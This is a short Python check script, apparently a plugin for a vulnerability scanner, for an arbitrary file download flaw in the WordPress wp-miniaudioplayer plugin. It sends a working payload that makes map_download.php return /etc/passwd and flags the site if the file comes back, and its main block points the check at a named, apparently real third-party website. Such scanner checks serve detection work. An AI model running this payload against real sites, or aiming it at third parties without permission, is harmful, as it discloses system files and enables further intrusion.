#!/usr/bin/env python
#-*- coding:utf-8 -*-
#__Author__ = zhiyuan
#___Sertype___ = WordPress wp-miniaudioplayer任意文件下载漏洞
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd'
    url = arg + payload
    code, head, body, errcode, _url = curl.curl2(url)
    if code == 200 and '/root:/bin/bash' in body:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://baiemusic.fr/')[1])